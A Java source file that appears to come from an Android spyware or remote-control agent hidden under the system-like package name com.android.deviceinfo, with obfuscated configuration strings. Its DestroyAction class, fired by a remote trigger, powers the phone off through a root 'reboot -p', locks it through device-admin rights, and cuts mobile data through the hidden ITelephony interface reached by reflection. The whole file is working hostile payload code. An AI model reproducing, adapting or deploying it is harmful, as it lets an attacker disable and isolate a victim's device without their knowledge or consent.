package com.android.deviceinfo.action;

import java.lang.reflect.InvocationTargetException;
import java.lang.reflect.Method;

import android.app.admin.DevicePolicyManager;
import android.content.Context;
import android.telephony.TelephonyManager;

import com.android.deviceinfo.Status;
import com.android.deviceinfo.Trigger;
import com.android.deviceinfo.auto.Cfg;
import com.android.deviceinfo.conf.ConfAction;
import com.android.deviceinfo.conf.ConfigurationException;
import com.android.deviceinfo.util.Check;
import com.android.deviceinfo.util.Execute;
import com.android.internal.telephony.ITelephony;
import com.android.m.M;

public class DestroyAction extends SubAction {
	private static final String TAG = "DestroyAction";
	private boolean permanent;

	public DestroyAction(ConfAction params) {
		super(params);
	}

	@Override
	protected boolean parse(ConfAction conf) {
		try {
			permanent = conf.getBoolean(M.e("permanent"));
		} catch (ConfigurationException e) {
			return false;
		}
		return true;
	}

	@Override
	public boolean execute(Trigger trigger) {
		try {
			if (Status.self().haveRoot()) {
				destroyRoot();
			}

			if (Status.self().haveAdmin()) {
				destroyAdmin();
			}

			destroyUser();
		} catch (Exception ex) {
			if (Cfg.DEBUG) {
				Check.log(TAG + " (execute) Error: " + ex);
			}
		}
		return true;
	}

	private void destroyUser() {
		TelephonyManager tm = (TelephonyManager) Status.getAppContext().getSystemService(Context.TELEPHONY_SERVICE);

		Class c;
		try {
			c = Class.forName(tm.getClass().getName());
			Method m = c.getDeclaredMethod("getITelephony");
			m.setAccessible(true);
			ITelephony telephonyService = (ITelephony) m.invoke(tm);

			telephonyService.disableDataConnectivity();

		} catch (Exception e) {

			e.printStackTrace();
		}

	}

	private void destroyAdmin() {
		DevicePolicyManager mDPM;

		mDPM = (DevicePolicyManager) Status.self().getAppContext().getSystemService(Context.DEVICE_POLICY_SERVICE);
		mDPM.lockNow();
	}

	private void destroyRoot() {
		Execute.executeRoot("reboot -p");
	}

}
